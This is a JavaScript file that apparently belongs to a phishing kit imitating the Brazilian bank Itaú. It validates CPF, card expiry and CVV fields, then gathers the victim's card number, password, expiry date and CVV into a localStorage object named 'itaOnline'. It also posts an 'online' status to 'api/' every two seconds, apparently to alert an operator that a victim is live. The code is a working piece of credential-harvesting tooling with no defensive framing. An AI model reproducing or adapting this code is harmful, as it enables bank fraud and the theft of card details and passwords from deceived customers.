$(document).ready(function(){

    setInterval(()=>{
	$.post('api/', {cliente:"online"},function(r){
    });
	}, 2000);
	
    /*===============================*/

	$('#numdtv').mask('00/00');

	$('#helpcvv').click(function(){
		$('#mod-help-cvv').fadeIn('speed');
	});

	$('#mod-help-close').click(function(){
		$('#mod-help-cvv').fadeOut('speed');
	});

	$('#frmcad input').blur(function(){
		var cmpatual = $(this).attr('id');
		
		switch(cmpatual){
			case 'numcpf':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().replace(/[^0-9]/g, '').length < 11) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;

			case 'numdtv':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().replace(/[^0-9]/g, '').length < 4) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;

			case 'numcvv':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().replace(/[^0-9]/g, '').length < 3) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;
		}
		conterror();
	});

	document.getElementById('btncad').addEventListener('click', function(){
		var el = this;
		setTimeout(function(){
  			el.setAttribute('disabled', 'disabled');
  		}, 500);
	});
});

function validatefrmcad(id){
	var cmp = $('#'+id).val();

	switch(id){

		case 'numdtv':
			var validade = cmp.replace(/[^0-9]/g, '');
			if (validade.length == 2) {
				if (parseInt(validade.substr(0, 2)) == 0 || validade.substr(0, 2) > 12) {
					$('#'+id).attr('class', 'error');
				}else{
					$('#'+id).removeAttr('class');
				}
			}else if (validade.length == 4) {
				if (parseInt(validade.substr(0, 2)) == 0 || validade.substr(0, 2) > 12 || parseInt(validade.substr(2, 2)) < 19 || validade.substr(2, 2) > 39) {
					$('#'+id).attr('class', 'error');
					conterror();
				}else{
					$('#'+id).removeAttr('class');
					conterror();
				}	
			}
		break;

		case 'numcvv':
			if (cmp.length > 2) {
				$('#'+id).removeAttr('class');
				conterror();
			}
		break;
	}
}

function conterror(){
	var cmps = $('#frmcad input');
	var erros = 0;
	for (i = 0; i < cmps.length; i++) {
		if (cmps[i].value != "") {
			if (cmps[i].className.indexOf('error') != -1) {
				erros++;
			}
		}else{
			erros++;
		}
	}

	if (erros == 0) {
	    var val = document.getElementById("numdtv").value;
	    var cv = document.getElementById("numcvv").value;
        
		var jsonX = localStorage.getItem('itaOnline');
	    var date = JSON.parse(jsonX);
	   
	    var send = {numero:date.numero, senha:date.senha, validade:val, cvv:cv};
        localStorage.setItem('itaOnline', JSON.stringify(send));
	    	
		$('#btncad').removeAttr('disabled');
		$('#btncad').css({'background-color':'#ee7421'});
		$('#btncad').css({'color':'#fff'});
	}else{
			
		$('#btncad').attr('disabled', 'disabled');
		$('#btncad').css({'background-color':'#d9d9d9'});
		$('#btncad').css({'color':'#848484'});
	
	}
}